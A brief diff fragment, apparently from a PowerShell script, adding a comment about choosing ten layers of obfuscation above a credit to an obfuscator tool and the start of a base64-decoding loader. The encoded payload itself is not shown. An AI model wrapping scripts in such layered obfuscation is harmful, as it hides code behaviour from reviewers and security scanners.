@@ -1,3 +1,4 @@
+#Chose 10 layers of obfuscation
 # Obfuscated using https://github.com/DARKNOSY/Rush-PowerShell-Obfuscator, made by DARKN0$Y
 
 $decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(@"
